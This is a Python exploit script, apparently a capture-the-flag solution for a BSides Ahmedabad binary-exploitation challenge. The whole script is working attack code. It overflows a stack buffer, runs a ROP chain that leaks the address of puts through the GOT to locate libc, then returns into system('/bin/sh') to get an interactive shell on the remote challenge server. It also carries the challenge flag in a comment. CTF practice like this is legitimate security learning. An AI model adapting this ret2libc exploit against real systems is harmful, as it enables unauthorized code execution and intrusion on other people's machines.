#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './vuln'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'pwn2.bsidesahmedabad.in', 'port':9001})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.31.so')
env.select()

#==========

binf = ELF(bin_file)
addr_got_pust       = binf.got['puts']
addr_main           = binf.sep_function['main']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_puts        = libc.sep_function['puts']

#==========

def attack(conn, **kwargs):
    rop = ROP(binf)
    rop.puts(addr_got_pust)
    rop.main()

    exploit  = b'a'*0x48
    exploit += bytes(rop)
    conn.sendlineafter(': \n', exploit)

    conn.recvuntil('Thank you!\n')
    addr_libc_puts = u(conn.recvline(keepends=False))
    libc.address = addr_libc_puts - offset_libc_puts
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    rop = ROP(binf)
    rop.raw(rop.ret.address)
    rop.call(addr_libc_system, [addr_libc_str_sh])

    exploit  = b'b'*0x48
    exploit += bytes(rop)
    conn.sendlineafter(': \n', exploit)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # Neko{Th4t's_4_n1c3_f33db4ck}

if __name__=='__main__':
    main()

#==========
